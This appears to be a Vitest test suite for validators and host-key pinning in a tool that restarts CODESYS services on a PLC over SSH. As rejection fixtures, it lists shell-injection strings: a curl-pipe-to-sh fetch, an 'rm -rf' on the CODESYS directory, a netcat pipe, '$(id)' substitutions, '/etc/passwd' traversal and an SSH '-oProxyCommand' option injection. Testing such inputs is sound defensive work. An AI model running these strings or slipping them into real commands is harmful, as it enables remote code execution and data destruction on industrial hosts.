import { describe, it, expect } from 'vitest';
import {
  validateServiceName,
  validateSshUser,
  validateSshHost,
  validatePort,
  verifyHostKey,
  fingerprintHostKey,
} from '../../src/ssh-restart-runtime';
import { validateBootAppPath } from '../../src/ssh-version';

// These params are interpolated into command strings that the REMOTE login
// shell parses, so the validators are the only thing standing between a
// tool argument and root on the PLC.

describe('validateServiceName', () => {
  it('accepts real systemd unit names', () => {
    for (const ok of ['codesyscontrol', 'codesyscontrol.service', 'getty@tty1', 'a-b_c.d']) {
      expect(validateServiceName(ok)).toBe(ok);
    }
  });

  it('rejects shell metacharacters', () => {
    for (const bad of [
      'x; curl http://h/s | sh',
      'x && reboot',
      'x`id`',
      'x$(id)',
      'x\nreboot',
      'x y',
      "x'y",
      '',
    ]) {
      expect(() => validateServiceName(bad)).toThrow(/Refusing to use service name/);
    }
  });
});

describe('validateBootAppPath', () => {
  it('accepts the default and other absolute paths', () => {
    const def = '/var/opt/codesys/PlcLogic/Application/Application.app';
    expect(validateBootAppPath(def)).toBe(def);
    expect(validateBootAppPath('/opt/a_b-c.1/x.app')).toBe('/opt/a_b-c.1/x.app');
  });

  it('rejects injection and traversal', () => {
    for (const bad of [
      '/x; rm -rf /var/opt/codesys',
      '/x | nc h 1',
      '/x $(id)',
      '../etc/passwd',
      '/var/../etc/passwd',
      'relative/path.app',
      '/x y.app',
    ]) {
      expect(() => validateBootAppPath(bad)).toThrow(/Refusing to use bootAppPath/);
    }
  });
});

describe('validateSshUser / validateSshHost', () => {
  it('accepts ordinary values', () => {
    expect(validateSshUser('pi')).toBe('pi');
    expect(validateSshHost('codesys-pi.local')).toBe('codesys-pi.local');
    expect(validateSshHost('192.168.1.10')).toBe('192.168.1.10');
    expect(validateSshHost('[fe80::1]')).toBe('[fe80::1]');
  });

  it('rejects values that ssh would parse as options', () => {
    // -oProxyCommand=... is local command execution, not just a bad login.
    expect(() => validateSshUser('-oProxyCommand=calc')).toThrow(/Refusing to use SSH user/);
    expect(() => validateSshHost('-oProxyCommand=calc')).toThrow(/Refusing to use SSH host/);
  });
});

describe('validatePort', () => {
  it('accepts in-range integers', () => {
    expect(validatePort(22, 'SSH port')).toBe(22);
    expect(validatePort(65535, 'SSH port')).toBe(65535);
  });

  it('rejects out-of-range and non-integers', () => {
    for (const bad of [0, -1, 65536, 1.5, NaN]) {
      expect(() => validatePort(bad, 'SSH port')).toThrow(/Refusing to use SSH port/);
    }
  });
});

describe('fingerprintHostKey', () => {
  it('produces an unpadded OpenSSH-style SHA256 fingerprint', () => {
    const fp = fingerprintHostKey(Buffer.from('some-key-blob'));
    expect(fp).toMatch(/^SHA256:[A-Za-z0-9+/]+$/);
    expect(fp.endsWith('=')).toBe(false);
  });

  it('is stable and distinguishes different keys', () => {
    const a = fingerprintHostKey(Buffer.from('key-a'));
    expect(fingerprintHostKey(Buffer.from('key-a'))).toBe(a);
    expect(fingerprintHostKey(Buffer.from('key-b'))).not.toBe(a);
  });
});

describe('verifyHostKey', () => {
  const base = { hostPort: 'plc:22', fingerprint: 'SHA256:AAA' };

  it('pins on first contact under tofu', () => {
    const v = verifyHostKey({ ...base, policy: 'tofu', pinned: null });
    expect(v).toMatchObject({ accept: true, pin: true });
  });

  it('accepts a matching pin without re-pinning', () => {
    const v = verifyHostKey({ ...base, policy: 'tofu', pinned: 'SHA256:AAA' });
    expect(v).toMatchObject({ accept: true, pin: false });
  });

  it('refuses a changed key -- the MITM case', () => {
    const v = verifyHostKey({ ...base, policy: 'tofu', pinned: 'SHA256:BBB' });
    expect(v.accept).toBe(false);
    expect(v.reason).toContain('HOST KEY CHANGED');
  });

  it('refuses an unknown key under strict', () => {
    const v = verifyHostKey({ ...base, policy: 'strict', pinned: null });
    expect(v.accept).toBe(false);
    expect(v.reason).toContain('hostKeyPolicy=strict');
  });

  it('honours an explicit expected fingerprint in both directions', () => {
    expect(
      verifyHostKey({ ...base, policy: 'strict', pinned: null, expected: 'SHA256:AAA' }).accept
    ).toBe(true);
    // An explicit mismatch must lose even when a matching pin exists.
    const v = verifyHostKey({
      ...base,
      policy: 'tofu',
      pinned: 'SHA256:AAA',
      expected: 'SHA256:ZZZ',
    });
    expect(v.accept).toBe(false);
    expect(v.reason).toContain('host key mismatch');
  });

  it('accepts anything under insecure', () => {
    const v = verifyHostKey({ ...base, policy: 'insecure', pinned: 'SHA256:BBB' });
    expect(v).toMatchObject({ accept: true, pin: false });
  });
});
